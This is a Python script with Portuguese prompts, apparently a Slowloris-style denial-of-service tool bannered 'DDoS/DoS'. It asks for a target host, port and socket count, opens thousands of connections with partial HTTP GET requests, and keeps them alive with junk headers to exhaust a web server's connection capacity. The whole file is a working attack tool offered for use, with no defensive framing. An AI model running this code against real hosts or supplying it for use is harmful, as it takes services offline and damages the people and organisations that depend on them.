import sys
import socket
import random
import time

credits = ''' ____  ____       ____    ______       ____
|  _ \|  _ \  ___/ ___|  / /  _ \  ___/ ___|
| | | | | | |/ _ \___ \ / /| | | |/ _ \___ \\
| |_| | |_| | (_) |__) / / | |_| | (_) |__) |
|____/|____/ \___/____/_/  |____/ \___/____/

 [*] Info: pressione "ctrl+c" para parar ataque.

 criado por: ksx1777
'''
print(credits)

ip = input(' - digite o host do alvo: ')
socket_count = input(' - quantia de sockets (default = 5000): ')
sleep_time = input(' - intervalo entre os ataques: ')
port = input(' - porta usada para criar conexão: ')

if ip == '':
    print('\n [!] erro: nenhum endereço digitado.\n')
    sys.exit()

if socket_count == '':
    socket_count = 5000
    print('\n [!] aviso: quantidade de sockets padrão - 5000\n')

if sleep_time == '' or sleep_time == 0:
    sleep_time = 1
    print('\n [!] intervalo padrão - 1s')

if port == '':
    port = 80
    print('\n [!] aviso: porta padrão - 80')

print('\n [*] - sockets criados: %s' % socket_count)

socket_list = []

def start_flood(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(60)
    s.connect((ip, int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    return s

def main():
    for _ in range(int(socket_count)):
        try:
            print(" [*] - criando sockets: %s" % _)
            s = start_flood(ip)
        except socket.error as e:
            print(e)
            break
        socket_list.append(s)

    while True:
        try:
            print(" [*] - quantidade de sockets: %s" % len(socket_list))
            for s in list(socket_list):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    socket_list.remove(s)

            for _ in range(int(socket_count) - len(socket_list)):
                try:
                    s = start_flood(ip)
                    if s:
                        socket_list.append(s)
                except socket.error as e:
                    print(e)
                    break
            print(" [*] intervalo de %d segundos" % int(sleep_time))
            time.sleep(int(sleep_time))

        except (KeyboardInterrupt, SystemExit):
            print("\n [!] programa encerrado.")
            break


if __name__ == "__main__":
    main()
